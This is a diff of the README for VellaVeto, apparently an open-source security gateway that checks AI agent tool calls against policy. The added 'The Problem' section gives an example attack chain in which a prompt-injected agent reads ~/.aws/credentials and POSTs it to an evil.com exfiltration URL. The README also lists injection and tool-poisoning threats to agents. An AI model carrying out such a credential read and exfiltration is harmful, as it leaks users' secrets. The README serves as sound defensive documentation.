@@ -18,58 +18,58 @@
     <a href="https://github.com/vellaveto/vellaveto/actions/workflows/codeql.yml"><img src="https://github.com/vellaveto/vellaveto/actions/workflows/codeql.yml/badge.svg?branch=main" alt="CodeQL"></a>
   </p>
   <p>
+    <a href="#the-problem">The Problem</a> &middot;
     <a href="#quick-start">Quick Start</a> &middot;
-    <a href="#architecture">Architecture</a> &middot;
-    <a href="#key-capabilities">Capabilities</a> &middot;
-    <a href="#whats-next">What's Next</a> &middot;
+    <a href="#how-it-compares">Compare</a> &middot;
     <a href="#security">Security</a> &middot;
+    <a href="#architecture">Architecture</a> &middot;
     <a href="#documentation">Docs</a>
   </p>
 </div>
 
 ---
 
-VellaVeto is a security-first control plane for agentic systems. It combines an [MCP](https://modelcontextprotocol.io/) (Model Context Protocol) policy gateway, centralized governance APIs, topology discovery, and a tamper-evident audit trail so teams can control how AI agents use tools across local and deployed environments.
+**VellaVeto is a runtime security engine for AI agent tool calls.** It intercepts [MCP](https://modelcontextprotocol.io/) and function-calling requests, enforces security policies on paths, domains, and actions, and maintains a tamper-evident audit trail. Deploy it as a stdio proxy, HTTP gateway, multi-tenant control plane, or consumer-side privacy shield.
 
-Deploy it as a stdio or HTTP gateway, run it as a multi-tenant control plane, extend policy with Cedar-compatible rules and Wasm plugins, and ship verifiable evidence through audit, compliance, and incident workflows.
+## The Problem
 
-The v6 foundation is complete. The next planning cycle focuses on turning that shipped platform into the default enterprise control plane for MCP and tool-calling agents through stronger registry trust, delegated identity, evidence automation, and easier managed onboarding. See [ROADMAP.md](ROADMAP.md).
+AI agents can read files, make HTTP requests, and execute commands. Without centralized controls:
+
+```
+Agent receives prompt injection
+  → reads ~/.aws/credentials
+  → POST https://evil.com/exfil?data=AKIA...
+  → no audit trail, no one notices
+```
+
+This is not hypothetical. In the last 15 months the MCP ecosystem has accumulated [30+ CVEs](https://www.practical-devsecops.com/mcp-security-vulnerabilities/) — tool poisoning, rug-pull attacks, path traversal in official servers, command injection via OAuth endpoints, and prompt injection through tool descriptions. 8,000+ MCP servers have been found exposed with no authentication.
+
+VellaVeto sits between AI agents and tool servers. Every tool call is evaluated against policy before execution. No policy match, missing context, or evaluation error results in `Deny`. Every decision is logged in a tamper-evident chain.
+
+```
+Agent attempts: read_file("/home/user/.aws/credentials")
+  → VellaVeto evaluates against policy
+  → Deny { reason: "path blocked by credential-protection rule" }
+  → Logged with SHA-256 chain + Ed25519 checkpoint
+  → Agent never sees the file contents
+```
+
+## What It Does
+
+VellaVeto is not just a proxy or firewall — it is a security control plane for agentic systems:
+
+- **Policy engine** — glob/regex/domain matching, parameter constraints, time windows, call limits, Cedar-style ABAC, Wasm plugins. <5ms P99 evaluation.
+- **Threat detection** — injection, tool squatting, rug pulls, schema poisoning, DLP, memory poisoning, multi-agent collusion. 20+ detection layers, not just regex.
+- **Identity and access** — OAuth 2.1/JWT, OIDC/SAML, RBAC, capability delegation, DPoP (RFC 9449), non-human identity lifecycle.
+- **Topology discovery** — auto-discover MCP servers, tools, and resources. Detect drift, tool shadowing, and namespace collisions.
+- **Audit and compliance** — tamper-evident logs (SHA-256 + Merkle + Ed25519), ZK proofs, evidence packs mapped to EU AI Act, SOC 2, DORA, NIS2, NIST AI 600-1, and 7 more frameworks.
+- **Consumer shield** — user-side PII sanitization, encrypted local audit, session isolation, stylometric fingerprint resistance, warrant canary.
 
 **Core guarantees:**
 - **Complete mediation** — request and response paths evaluated before tool execution and before model return
-- **Fail-closed** — no policy match, missing context, or evaluation error results in `Deny`
+- **Fail-closed** — errors, missing policies, and unresolved context all produce `Deny`
 - **Tamper-evident audit** — SHA-256 hash chain + Merkle proofs + Ed25519 signed checkpoints
 - **Public security contract** — [Security Guarantees](docs/SECURITY_GUARANTEES.md) + [Assurance Case](docs/ASSURANCE_CASE.md) with reproducible evidence
-
-## What's New
-
-- **v6 foundation complete** — Phases 36-72 are shipped across runtime enforcement, IAM, discovery, analytics, compliance, and deployment surfaces. [Roadmap reset](ROADMAP.md)
-- **Consumer Shield** (Phase 67) — New deployment mode for consumer AI interactions. PII sanitization, encrypted local audit, session isolation, warrant canary. [Details](CHANGELOG.md)
-- **Three-tier licensing** — MPL-2.0 (core + consumer), Apache-2.0 (canary + benchmark), BUSL-1.1 (enterprise, converts to MPL-2.0 after 3 years). [Details](LICENSING.md)
-- **232 adversarial audit rounds** — 1,550+ findings resolved across engine, MCP, server, audit, proxy, and discovery
-- **9,600+ tests passing** across Rust, Python, Go, TypeScript, Java, Terraform, React, shell + 24 fuzz targets
-
-See [CHANGELOG.md](CHANGELOG.md) for full history.
-
-## What's Next
-
-The next roadmap is not about adding more generic gateway features. The core runtime is already in place. The current planning cycle is aimed at the control-plane layer above the gateway.
-
-- **Verified registry and connector trust** — make the registry a runtime trust boundary, not just a catalog
-- **Delegated identity and access graph** — turn existing OIDC, SAML, DPoP, M2M, and step-up auth into one visible access plane
-- **Inventory and posture views** — turn topology, drift, and policy coverage into operator-facing exposure reporting
-- **Hosted onboarding and managed deployment paths** — reduce friction against managed MCP gateway competitors
-- **Evidence automation** — turn audit and control mapping into reusable customer-grade evidence packs
-
-The forward plan is documented in [ROADMAP.md](ROADMAP.md), covering planned phases 73-81.
-
-## Why VellaVeto?
-
-AI agents with tool access can read files, make HTTP requests, execute commands, modify data, and trigger long-running workflows across multiple services. Without centralized controls, a prompt injection or misbehaving agent can exfiltrate credentials, call unauthorized APIs, bypass restrictions via Unicode tricks or path traversal, impersonate tools, or drift into unsafe cross-tool behavior that no single SDK sees.
-
-VellaVeto gives you one place to enforce policy, govern identity, inventory tools, approve risky actions, and audit every decision. The gateway mediates each tool call before execution, the control plane manages policy and runtime state, and the evidence layer turns security decisions into traceable records. Trust math, not promises.
-
-The four strategic moats for the next cycle are: identity, registry and inventory, evidence, and distribution.
 
 ## Quick Start
 
@@ -185,27 +185,64 @@ Lower crates never depend on higher crates. `vellaveto-operator` is standalone (
 
 ## Key Capabilities
 
-| Capability | What | Key Tech | Docs |
-|---|---|---|---|
-| **Policy Engine** | Glob/regex/domain matching, parameter constraints, time windows, call limits, action sequences, Cedar-style ABAC | Pre-compiled patterns, <5ms P99, decision cache, Wasm plugins | [Policy](docs/POLICY.md) |
-| **Threat Detection** | Injection, tool squatting, rug pulls, schema poisoning, confused deputy, DLP, memory poisoning, multi-agent collusion | OWASP Agentic Top 10 coverage, Aho-Corasick, NFKC, Levenshtein | [Threat Model](docs/THREAT_MODEL.md) |
-| **Auth & Access** | OAuth 2.1/JWT, ABAC with forbid-overrides, capability delegation, DPoP (RFC 9449), identity federation, least-agency, NHI lifecycle | Ed25519, OIDC/SAML, RBAC, continuous authorization | [IAM](docs/IAM.md) |
-| **Audit & Compliance** | Tamper-evident logs, ZK proofs (Pedersen+Groth16), EU AI Act, SOC 2, DORA/NIS2, NIST AI 600-1, ISO 42001, OWASP MCP Top 10 | SHA-256 chains, Merkle proofs, ML-DSA-65 (PQC), evidence packs | [Security Guarantees](docs/SECURITY_GUARANTEES.md) |
-| **Consumer Shield** | PII sanitization, encrypted local audit, session isolation, warrant canary | XChaCha20-Poly1305, Argon2id, per-session PII mapping | [Consumer Shield](examples/presets/consumer-shield.toml) |
-| **Deployment** | 6 modes (HTTP, stdio, WebSocket, gRPC, gateway, consumer shield), K8s operator (3 CRDs), Helm, Terraform | All MCP transports, cross-transport fallback, distributed tracing | [Deployment](docs/DEPLOYMENT.md) |
+| | What It Does | Docs |
+|---|---|---|
+| **Policy Engine** | Glob/regex/domain matching, parameter constraints, time windows, call limits, action sequences, Cedar-style ABAC, Wasm plugins. Pre-compiled patterns, <5ms P99, decision cache. | [Policy](docs/POLICY.md) |
+| **Threat Detection** | 20+ detection layers: injection (Aho-Corasick + NFKC + obfuscation decode), tool squatting, rug pulls, schema poisoning, DLP, memory poisoning, multi-agent collusion. Maps to [OWASP Agentic Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/). | [Threat Model](docs/THREAT_MODEL.md) |
+| **Identity & Access** | OAuth 2.1/JWT, OIDC/SAML, RBAC (4 roles, 14 perms), ABAC with forbid-overrides, capability delegation, DPoP (RFC 9449), non-human identity lifecycle. | [IAM](docs/IAM.md) |
+| **Discovery** | Auto-discover MCP servers, tools, resources via topology graph. Detect drift, tool shadowing, namespace collisions. Topology guard as pre-policy filter. | [Architecture](#architecture) |
+| **Audit & Compliance** | Tamper-evident logs (SHA-256 + Merkle + Ed25519), ZK proofs (Pedersen + Groth16), evidence packs for EU AI Act, SOC 2, DORA, NIS2, NIST AI 600-1, ISO 42001, and 6 more. | [Security Guarantees](docs/SECURITY_GUARANTEES.md) |
+| **Consumer Shield** | User-side PII sanitization, encrypted local audit (XChaCha20-Poly1305), session isolation, credential vault, stylometric fingerprint resistance, warrant canary. | [Consumer Shield](examples/presets/consumer-shield.toml) |
+| **Deployment** | 6 modes: HTTP, stdio, WebSocket, gRPC, gateway, consumer shield. K8s operator (3 CRDs), Helm chart, Terraform provider, VS Code extension. | [Deployment](docs/DEPLOYMENT.md) |
 
 ## Security
 
-VellaVeto has undergone **232 rounds of adversarial security auditing** covering 31+ attack classes mapped to the [OWASP Top 10 for Agentic Applications](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/).
+### Internal Adversarial Auditing
+
+VellaVeto has undergone **232 rounds of internal adversarial security auditing** covering 31+ attack classes mapped to the [OWASP Top 10 for Agentic Applications](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/). These are not third-party audits — they are systematic internal red-team exercises where we attack our own code, document findings, fix them, and verify the fixes. 1,550+ findings resolved. The methodology and findings are documented in the [changelog](CHANGELOG.md) and [security review](docs/SECURITY_REVIEW.md).
 
 - **Fail-closed everywhere** — empty policy sets, missing parameters, lock poisoning, capacity exhaustion, and evaluation errors all produce `Deny`
 - **Zero `unwrap()` in library code** — all error paths return typed errors; panics reserved for tests only
-- **Formal verification** — TLA+ (policy engine, ABAC, workflow, task lifecycle, cascading failure), Alloy (capability delegation), Kani (5 proof harnesses)
+- **9,600+ tests** — Rust, Python, Go, TypeScript, Java, Terraform, React, shell + 24 fuzz targets, zero warnings
 - **Post-quantum ready** — Hybrid Ed25519 + ML-DSA-65 (FIPS 204) audit signatures, feature-gated behind `pqc-hybrid`
 
-**Known limitations:** Injection detection is a pre-filter, not a security boundary. DLP does not detect split secrets. No TLS termination (use a reverse proxy). See [Security Guarantees](docs/SECURITY_GUARANTEES.md) for the full normative contract.
+### Formal Verification
+
+We use formal methods to prove — not just test — critical security properties:
+
+| Tool | What's Proven | Files |
+|---|---|---|
+| **TLA+** | Policy engine determinism, ABAC forbid-override correctness, workflow constraint enforcement, task lifecycle safety, cascading failure recovery | [formal/tla/](formal/tla/) |
+| **Lean 4** | Fail-closed property (errors → Deny), evaluation determinism, path normalization idempotence | [formal/lean/](formal/lean/) |
+| **Coq** | 15 theorems: fail-closed, determinism, ABAC forbid-override, capability delegation attenuation | [formal/coq/](formal/coq/) |
+| **Alloy** | Capability delegation cannot escalate privileges | [formal/alloy/](formal/alloy/) |
+| **Kani** | 5 proof harnesses for Rust implementation correctness | [formal/kani/](formal/kani/) |
+
+Formal verification is rare in security tooling. We believe the properties that matter most — fail-closed behavior, determinism, no privilege escalation — should be proven, not just tested. See [formal/README.md](formal/README.md) for details.
+
+### Known Limitations
+
+Injection detection is a pre-filter, not a security boundary. DLP does not detect secrets split across multiple calls. No TLS termination (use a reverse proxy). The internal audit process is thorough but is not a substitute for independent third-party review. See [Security Guarantees](docs/SECURITY_GUARANTEES.md) for the full normative contract.
 
 Full details: [Security Guarantees](docs/SECURITY_GUARANTEES.md) | [Threat Model](docs/THREAT_MODEL.md) | [Assurance Case](docs/ASSURANCE_CASE.md)
+
+## How It Compares
+
+| | **VellaVeto** | **Agent-Wall** | **PipeLock** | **MCP Defender** |
+|---|---|---|---|---|
+| **Language** | Rust | TypeScript (npm) | Go (single binary) | Desktop app (Electron) |
+| **Evaluation latency** | <5ms P99 | Not published | Not published | N/A (desktop) |
+| **Policy engine** | Glob/regex/domain, ABAC, Cedar, Wasm plugins, time windows, call sequences | YAML rule engine | Regex + DLP rules | Signature-based allow/block |
+| **Injection detection** | 20+ layers (Aho-Corasick, NFKC, ROT13, base64 decode, math symbols, leetspeak, emoji smuggling, FlipAttack, memory poisoning, schema poisoning, ...) | 30+ regex patterns | 8 chain detection patterns | Signature scanning |
+| **Transport coverage** | HTTP, WebSocket, gRPC, stdio, SSE (verified security parity) | stdio | stdio | stdio |
+| **Audit trail** | SHA-256 chain + Merkle + Ed25519 + ZK proofs + PostgreSQL | Basic logging | Basic logging | Real-time alerts |
+| **Compliance** | 12 frameworks (EU AI Act, SOC 2, DORA, NIS2, ...) | None | None | None |
+| **Formal verification** | TLA+, Lean 4, Coq, Alloy, Kani | None | None | None |
+| **Consumer privacy** | PII sanitization, session isolation, credential vault, stylometric resistance | PII scanning | PII scanning | None |
+| **Ease of setup** | `cargo install` / Docker / Helm | `npm install -g` | Single binary | Download app |
+| **License** | MPL-2.0 / Apache-2.0 / BUSL-1.1 | MIT | MIT | Proprietary |
+
+**Trade-offs:** Agent-Wall and PipeLock are simpler to install and better suited for quick single-agent setups. VellaVeto is designed for teams that need centralized governance, compliance evidence, and multi-transport coverage across multiple agents and environments. If you just want a quick guard on a single Claude Desktop session, the simpler tools may be the right choice.
 
 ## Deployment Modes
 
